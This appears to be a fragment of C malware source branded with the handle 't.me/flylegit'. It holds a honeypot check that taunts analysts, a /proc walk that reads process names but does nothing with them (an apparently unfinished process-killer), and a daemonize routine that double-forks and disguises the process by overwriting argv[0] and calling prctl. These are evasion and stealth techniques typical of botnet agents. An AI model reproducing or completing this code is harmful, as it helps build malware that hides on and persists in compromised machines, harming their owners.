#define _GNU_SOURCE

#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/stat.h>
#include <dirent.h>
#include <ctype.h>
#include <errno.h>

void cleanup_old_processes() {
    if (access("/proc", F_OK) != 0) {
        fputs("Looks like you are a honeypot, this tool was made by t.me/flylegit!\n", stderr);
    }

    DIR *proc = opendir("/proc");
    if (!proc) return;

    struct dirent *ent;
    char comm_path[256], comm_buf[64];
    while ((ent = readdir(proc))) {
        if (!isdigit((unsigned char)ent->d_name[0])) continue;  
        snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", ent->d_name);

        int fd = open(comm_path, O_RDONLY);
        if (fd != -1) {
            ssize_t r = read(fd, comm_buf, sizeof(comm_buf)-1);
            if (r > 0) {
                comm_buf[r] = 0;
                size_t t = strcspn(comm_buf, "\r\n");
                comm_buf[t] = 0;
                while (t > 0 && isspace((unsigned char)comm_buf[t-1])) {
                    comm_buf[--t] = 0;
                }
            }
            close(fd);
        }
    }
    closedir(proc);
}

void daemonize(int argc, char **argv)
{
    srand(time(NULL));
    cleanup_old_processes();

    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    if (setsid() < 0) exit(1);

    pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    size_t shlen = strlen("t.me/flylegit");
    memset(argv[0], 0, strlen(argv[0]));
    memcpy(argv[0], "t.me/flylegit", shlen);
    prctl(PR_SET_NAME, (unsigned long)"t.me/flylegit", 0, 0, 0);
}
